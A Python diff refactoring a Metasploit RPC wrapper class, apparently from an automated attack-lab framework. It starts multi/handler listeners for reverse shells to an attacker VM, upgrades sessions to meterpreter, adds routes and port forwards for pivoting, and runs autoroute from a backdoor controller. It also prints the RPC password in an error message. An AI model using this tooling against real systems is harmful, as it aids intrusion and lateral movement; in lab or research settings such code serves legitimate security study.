@@ -6,6 +6,8 @@ from time import sleep as delay
 from util import Constants as C
 from attack import Attack_DB
 import subprocess
+import time
+import copy
 
 class MetaClient:
 
@@ -16,12 +18,25 @@ class MetaClient:
 
     
     #Viene creata un istanza di client Metasploit che si connette al server con password porta e ip specificati
-    def __init__(self, server_password, server_port, server_ip):
+    def __init__(self, server_password, server_port=55553, server_ip="0.0.0.0", ssl=True):
+
         self.output = ""
-        self.client = MetasploitWrapper(server_password, port=server_port, server=server_ip)
-        if self.client:
-            Logger.log(self, f"client connected - {server_ip=}, {server_port=}", level=Logger.INFO)
-        #self.bc_client=bc
+
+        try:
+            self.client = MsfRpcClient(server_password, port=server_port, server=server_ip, ssl=ssl)
+        except ConnectionError as e:
+            print(f"{C.COL_RED}[-] Can't connect to msf rpc server @{server_ip}:{server_port} with password: {server_password}{C.COL_RESET}")
+            Logger.log(self, f"RPC client connection error - {server_port=}, {server_ip=}, {ssl=}", level=Logger.ERROR)
+            exit(1)
+
+        Logger.log(self, f"RPC client connected - {server_port=}, {server_ip=}, {ssl=}", level=Logger.INFO)
+
+        self.cid = self.client.consoles.console().cid
+        Logger.log(self, f"Console created - {self.cid=}", level=Logger.INFO)
+
+        # flush the banner
+        self.client.consoles.console(self.cid).read()
+        
     
 
     #Viene chiamato il metodo execute sull'attacco attack preso in input
@@ -64,22 +79,22 @@ class MetaClient:
         self.old_sessions = None
         self.new_sessions = None
 
-        self.old_sessions = self.client.get_active_sessions(sleep=sleep)
+        self.old_sessions = self.get_active_sessions(sleep=sleep)
         
-        aus_client = self.client.client
+        aus_client = self.client
         
         handler_p = aus_client.modules.use('payload', payload)
         handler_p['LHOST'] = C.ATTACKER_VM   # attacker ip
         handler_p['LPORT'] = C.NETCAT_PORT   # port defined in config file to connect to the netcat port used by docker_escape
 
         handler = aus_client.modules.use('exploit', 'multi/handler')
-        #print(self.client.get_active_sessions(sleep=sleep))
+        #print(self.get_active_sessions(sleep=sleep))
         handler.execute(payload=handler_p)
 
         delay(10)
 
-        self.new_sessions = self.client.get_active_sessions(sleep=sleep)
-        #print(self.client.get_active_sessions(sleep=sleep))
+        self.new_sessions = self.get_active_sessions(sleep=sleep)
+        #print(self.get_active_sessions(sleep=sleep))
 
         diff = set(self.new_sessions) - set(self.old_sessions)
 
@@ -108,29 +123,29 @@ class MetaClient:
         self.old_sessions = None
         self.new_sessions = None
         output=[]
-        self.old_sessions = self.client.get_active_sessions(sleep=sleep)
+        self.old_sessions = self.get_active_sessions(sleep=sleep)
         instr_str=C.METERPRETER_UPGRADE.format(C.ATTACKER_VM,C.METERPRETER_PORT, sess)
         instr_list=instr_str.split("\n")
         #print(instr_list)
         for i in instr_list:
-            self.client.client.consoles.console(self.client.cid).write(i)
+            self.client.consoles.console(self.cid).write(i)
             if("resource" in i or "exploit" in i or "run" in i):
                 delay(50)
             else:
                 delay(1)
-            out=self.client.client.consoles.console(self.client.cid).read()
+            out=self.client.consoles.console(self.cid).read()
             #print(out)
             output.append(out["data"])
         
         with time_limit(300):
-            while self.client.client.consoles.console(self.client.cid).is_busy():
+            while self.client.consoles.console(self.cid).is_busy():
                 delay(1)
                 
-        out = self.client.client.consoles.console(self.client.cid).read()
+        out = self.client.consoles.console(self.cid).read()
 
         delay(5)
 
-        self.new_sessions = self.client.get_active_sessions(sleep=sleep)
+        self.new_sessions = self.get_active_sessions(sleep=sleep)
 
         diff = set(self.new_sessions) - set(self.old_sessions)
             
@@ -148,14 +163,49 @@ class MetaClient:
     def prepare(self, router, atk_port, exposed_port, atk_ip):
         cmd=C.ADD_PORTFWD.format(atk_ip,atk_port,exposed_port)
         #print(cmd)
-        self.client.add_portfwd(router,cmd)
+        self.add_portfwd(router,cmd)
         return
+
+
+    #Recupera un elenco di tutte le sessioni attive associate al client
+    #Se sleep = True aspetta prima di effettuare l'operazione
+    def get_active_sessions(self, sleep=True):
+        """
+        Returns a list of open sessions associated with the client
+        """ 
+        if sleep:
+            time.sleep(MetaClient.GET_SESSIONS_DELAY)
+        if self.client:
+            return copy.deepcopy(self.client.sessions.list)
+        
+
+    #print route for debugging 
+    def route_print(self):
+        self.client.consoles.console(self.cid).write(C.ROUTE_PRINT)
+        routes=self.client.consoles.console(self.cid).read()
+        #print(routes)
+
     
+    #aggiunge una nuova route al target
+    def route_add(self,sess,target_ip):
+        #print(C.ROUTE_ADD.format(target_ip,sess))
+        self.client.consoles.console(self.cid).write(C.ROUTE_ADD.format(target_ip,sess))
+        routes=self.client.consoles.console(self.cid).read()
+        #print(routes)
 
 
+    #elimina tutte le route attualmente configurate
+    def route_flush(self):
+        self.client.consoles.console(self.cid).write("route flush")
+        routes=self.client.consoles.console(self.cid).read()
+        #print(routes)
 
-
-
+    #crea un port forwarding sulla shell della sessione passata come parametro
+    def add_portfwd(self, sess, cmd):
+        self.route_flush()
+        self.client.sessions.session(sess).write(cmd)
+        portfwd=self.client.sessions.session(sess).read()
+        #print(portfwd)
 
 
 
@@ -238,3 +288,4 @@ class BackdoorCommander:
         Logger.log(self, f"Running post/multi/manage/autoroute", level=Logger.INFO)
 
         return self.interact_with_session(session, "run post/multi/manage/autoroute")
+        
